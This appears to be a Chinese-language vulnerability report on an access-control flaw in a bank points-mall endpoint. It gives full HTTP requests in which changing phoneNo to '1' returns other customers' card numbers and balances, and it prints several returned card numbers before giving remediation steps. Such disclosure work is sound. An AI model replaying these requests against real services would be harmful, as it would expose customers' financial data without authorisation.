# 积分商城存在银行卡号越权查询漏洞

**漏洞名称：** 积分商城存在银行卡号越权查询漏洞

**漏洞等级：** 高危

**漏洞类型：** 水平越权 / 敏感信息泄露

**漏洞URL：**

`https://ttt.ebanktest.com.cn:18234/emallapp/commonOrder/queryCardNOByPhone`

## 详细描述

V+会员权益领取流程中的“查询卡号”接口只校验用户是否登录，不校验请求中的 `phoneNo` 是否属于当前登录会员。

服务端直接使用客户端提交的手机号查询卡号，返回完整的明文银行卡号和余额。实测普通会员 A 查询自己的手机号返回“未查询到客户卡号”，但把 `phoneNo` 改成 `1` 或 `0` 后，接口返回 `retcode=0000`，并给出不属于 A 的银行卡号。

同一账号反复请求，还能拿到多个不同的他人卡号，说明返回结果不是当前会话主体的数据。

## 复现步骤

前置条件：一个普通会员账号的有效 `SESSION`。

### 第 1 步：查询自己的手机号，确认基线

完整请求包：

```http
POST /emallapp/commonOrder/queryCardNOByPhone HTTP/1.1
Host: ttt.ebanktest.com.cn:18234
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/x-www-form-urlencoded;charset=utf-8
X-Requested-With: XMLHttpRequest
Origin: https://ttt.ebanktest.com.cn:18234
Referer: https://ttt.ebanktest.com.cn:18234/html/10124/view/order/confirmOrder/sureGetType1.html?getType=30
Cookie: SESSION=<普通会员会话>
Content-Length: 46
Connection: close

bankcode=10124&channel=007&phoneNo=15967224215
```

响应包：

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"cardBlance":null,"retshow":"未查询到客户卡号","cardNo":null,"retcode":"9990"}
```

`9990` 说明当前账号查询自己的号码没有查到卡号，后面返回的卡号不可能是“本来就有权限看”的数据。

### 第 2 步：把手机号换成不属于自己的值

完整请求包：

```http
POST /emallapp/commonOrder/queryCardNOByPhone HTTP/1.1
Host: ttt.ebanktest.com.cn:18234
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/x-www-form-urlencoded;charset=utf-8
X-Requested-With: XMLHttpRequest
Origin: https://ttt.ebanktest.com.cn:18234
Referer: https://ttt.ebanktest.com.cn:18234/html/10124/view/order/confirmOrder/sureGetType1.html?getType=30
Cookie: SESSION=<普通会员会话>
Content-Length: 36
Connection: close

bankcode=10124&channel=007&phoneNo=1
```

响应包：

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"cardBlance":"0.0","retshow":"交易成功","cardNo":"0001059239","retcode":"0000"}
```

`phoneNo=1` 不是有效手机号，也不属于当前会员，但接口仍返回了完整卡号和余额。

### 第 3 步：重复请求，确认可以拿到多个他人卡号

保持同一个 `SESSION`，重复提交第 2 步请求，返回的 `cardNo` 会变化，例如：

```json
{"cardBlance":"0.0","retshow":"交易成功","cardNo":"0000881987","retcode":"0000"}
{"cardBlance":"0.0","retshow":"交易成功","cardNo":"0000091777","retcode":"0000"}
{"cardBlance":"0.0","retshow":"交易成功","cardNo":"0002260198","retcode":"0000"}
```

换另一个普通会员 B 的 `SESSION`，提交同样的 `phoneNo=1`，也会返回他人卡号。说明返回结果由请求参数决定，不由当前登录主体决定。

## 影响范围

任意普通登录会员都可以通过修改 `phoneNo` 查询他人的完整银行卡号和余额。已实测取得多个互不相同的明文卡号，且接口没有频控迹象，可被脚本批量查询。

## 修复方案

1. 服务端不要使用客户端提交的 `phoneNo` 作为查询主体，必须从当前 `SESSION` 关联的会员信息中取手机号。
2. 查询卡号时增加对象归属校验：手机号、会员号、卡号必须属于当前登录主体。
3. 返回卡号做掩码处理，并对查询接口增加频率限制和异常审计。
